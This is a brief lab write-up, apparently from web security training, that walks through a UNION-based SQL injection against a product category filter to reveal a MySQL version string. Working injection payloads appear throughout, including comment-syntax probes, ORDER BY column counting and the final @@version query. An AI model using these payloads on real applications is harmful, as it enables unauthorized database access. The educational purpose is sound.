# SQL injection attack, querying the database type and version on MySQL and Microsoft

### Given

- SQL injection vulnerability in product category filter.

- can use a UNION attack to retrieve the results from an injected query. 

### Task

- Display the database version string


### Analysis
- examine product category filter and append `'` at the end. => gives 500 Internal server error
    - this means, vulnerability of SQLi attack at product category filter is confirmed.
- try commenting out the rest of the query using double hyphen `--` at the end. ==> response [500]
- try commenting out the rest of the query using hash `#` at the end. ==> response [500]
- try commenting out the rest of the query using double hyphens with a white space at the end, `-- -` or `--%20` ==> response [200]
    - white space after double hyphens is comment syntax for MySQL.
    - hence, we can conclude that MySQL is used at the backend.

- checking for number of columns (to perform union based attacks)
    - payload: `ORDER BY 1--` => Response [200]
    - payload: `ORDER BY 2--` => Response [200]
    - payload: `ORDER BY 3--` => Response [500] ==> only two columns present in table

- checking for columns if it supports characters or not
    - payload: `UNION SELECT NULL, NULL-- -` => response [200]
    - payload: `UNION SELECT 'A', NULL-- -` => response [200]
    - payload: `UNION SELECT 'A', 'A'-- -` => response [200] ==> both columns supports the characters

- using payload to check database for MySQL : `SELECT @@version`
    - payload: `'UNION SELECT NULL, @@version-- -` => response [200] ==> lab solved 